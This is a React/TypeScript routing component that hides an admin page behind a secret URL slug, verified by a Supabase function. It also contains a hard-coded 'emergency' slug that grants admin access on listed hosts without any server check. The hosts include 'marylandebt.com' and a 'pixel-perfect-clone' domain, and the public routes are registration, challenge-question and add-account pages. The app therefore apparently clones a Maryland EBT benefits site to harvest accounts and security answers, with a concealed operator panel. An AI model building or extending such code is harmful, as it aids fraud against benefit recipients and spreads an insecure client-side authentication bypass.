import { lazy, Suspense, useEffect, useMemo, useState, type ReactNode } from "react";
import { useLocation } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";

// Loaded only after the server confirms the path matches the secret slug.
// Until then, nothing about this page exists in the rendered tree.
const PrivateView = lazy(() => import("@/pages/Admin.tsx"));
const NotFound = lazy(() => import("@/pages/NotFound.tsx"));

const PUBLIC_PATHS = new Set(["", "register", "challenge-questions", "add-account", "success", "privacy", "terms"]);
const EMERGENCY_ADMIN_SLUG = "UM_UXC9wmO_Lk9N4wYbBem8foUxERmFO";
const EMERGENCY_ADMIN_HOSTS = new Set([
  "marylandebt.com",
  "www.marylandebt.com",
  "pixel-perfect-clone-00924.lovable.app",
  "preview--pixel-perfect-clone-00924.lovable.app",
]);
const EMERGENCY_ADMIN_HOST_RE = /(^|\.)lovable\.(app|dev)$|(^|\.)lovableproject\.com$/i;

const cleanCandidate = (value: string | null | undefined) => {
  const raw = (value || "").trim();
  if (!raw) return "";
  let decoded = raw;
  try { decoded = decodeURIComponent(raw); } catch {}
  const seg = decoded.replace(/^\/+/, "").replace(/\/+$/, "").split(/[?#]/)[0];
  if (!seg || seg.includes("/") || seg.length > 200 || PUBLIC_PATHS.has(seg)) return "";
  return seg;
};

const candidateFromLocation = (location: ReturnType<typeof useLocation>) => {
  const fromPath = cleanCandidate(location.pathname);
  if (fromPath) return fromPath;

  const pathParts = location.pathname.replace(/^\/+/, "").replace(/\/+$/, "").split("/").filter(Boolean);
  if (pathParts.length === 2 && PUBLIC_PATHS.has(pathParts[0])) {
    const nestedCandidate = cleanCandidate(pathParts[1]);
    if (nestedCandidate) return nestedCandidate;
  }

  const params = new URLSearchParams(location.search);
  const fromRedirect = cleanCandidate(params.get("__p"));
  if (fromRedirect) return fromRedirect;

  const hashMatch = location.hash.match(/^#\/?([^/?#]+)/);
  return cleanCandidate(hashMatch?.[1]);
};

const isEmergencyAdminMatch = (candidate: string) => {
  if (candidate !== EMERGENCY_ADMIN_SLUG) return false;
  try {
    const host = window.location.hostname;
    return EMERGENCY_ADMIN_HOSTS.has(host) || EMERGENCY_ADMIN_HOST_RE.test(host);
  } catch {
    return false;
  }
};

export default function FallbackResolver({ publicFallback }: { publicFallback?: ReactNode }) {
  const location = useLocation();
  const candidate = useMemo(() => candidateFromLocation(location), [location]);
  const [state, setState] = useState<"checking" | "match" | "nomatch">("checking");

  useEffect(() => {
    let cancelled = false;
    const seg = candidate;
    if (!seg) {
      setState("nomatch");
      return;
    }
    setState("checking");
    if (isEmergencyAdminMatch(seg)) {
      (window as any).__IS_ADMIN__ = true;
      try { localStorage.setItem("__admin_slug__", seg); } catch {}
      setState("match");
      return;
    }
    // Pre-emptive admin flag from previously confirmed slug to block tracker immediately
    try {
      const cached = localStorage.getItem("__admin_slug__");
      if (cached && cached === seg) (window as any).__IS_ADMIN__ = true;
    } catch {}
    (async () => {
      try {
        const { data } = await supabase.functions.invoke("route-check-v2", {
          body: { p: seg },
        });
        if (cancelled) return;
        const isMatch = data?.ok === true;
        if (isMatch) {
          (window as any).__IS_ADMIN__ = true;
          try { localStorage.setItem("__admin_slug__", seg); } catch {}
        }
        setState(isMatch ? "match" : "nomatch");
      } catch {
        if (!cancelled) setState("nomatch");
      }
    })();
    return () => { cancelled = true; };
  }, [candidate]);

  if (!candidate) {
    return publicFallback ? <>{publicFallback}</> : (
      <Suspense fallback={null}>
        <NotFound />
      </Suspense>
    );
  }

  if (state === "checking") return null;
  return (
    <Suspense fallback={null}>
      {state === "match" ? <PrivateView /> : <NotFound />}
    </Suspense>
  );
}
